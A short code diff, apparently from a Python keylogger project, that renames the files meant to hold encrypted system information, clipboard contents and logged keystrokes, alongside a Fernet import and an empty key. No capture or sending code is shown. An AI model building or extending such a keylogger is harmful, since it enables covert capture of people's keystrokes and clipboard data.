@@ -2,9 +2,9 @@ from cryptography.fernet import Fernet
 
 key = " "
 
-system_information_e = 'e_system.txt'
+system_information_e = 'e_systeminfo.txt'
 clipboard_information_e = 'e_clipboard.txt'
-keys_information_e = 'e_keys_logged.txt'
+keys_information_e = 'e_key_log.txt'
 
 
 
